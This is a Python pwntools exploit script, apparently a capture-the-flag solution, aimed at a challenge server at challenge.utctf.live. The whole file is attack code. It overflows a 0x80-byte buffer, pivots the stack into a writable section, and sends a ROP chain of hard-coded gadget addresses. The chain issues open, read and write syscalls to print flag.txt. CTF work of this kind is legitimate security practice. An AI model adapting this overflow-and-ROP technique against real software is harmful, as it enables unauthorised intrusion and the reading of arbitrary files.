#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("challenge.utctf.live", 5141)

input()

rw_section = 0x4c6a00
pop_rdi = 0x000000000040204f
pop_rsi = 0x000000000040a0be
pop_rdx_rbx = 0x000000000048630b
pop_rax = 0x0000000000450507
# syscall = 0x0000000000401e04
syscall = 0x4816f2
xchg_edi_eax = 0x00000000004910da

# stack pivot
payload = b'a'*0x80 + p64(rw_section) + p64(exe.sym['main'] + 97)
p.sendlineafter(b'Input> ', payload)

payload = b'flag.txt\0'
payload = payload.ljust(0x80, b'a') + p64(rw_section + 0x58)
# open
payload += p64(pop_rax) + p64(0x2) + p64(pop_rdi) + p64(rw_section - 0x80) + p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbx) + p64(0) + p64(0) + p64(syscall) + p64(0x4c6ae0 - 0x8)
# read
payload += p64(xchg_edi_eax) + b'a'*0x38 + p64(pop_rax) + p64(0) + p64(pop_rsi) + p64(rw_section + 0x150) 
payload += p64(pop_rdx_rbx) + p64(100) + p64(0) + p64(syscall)
# write
payload += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rdx_rbx) + p64(100) + p64(0) + p64(syscall)
p.sendline(payload)

p.interactive()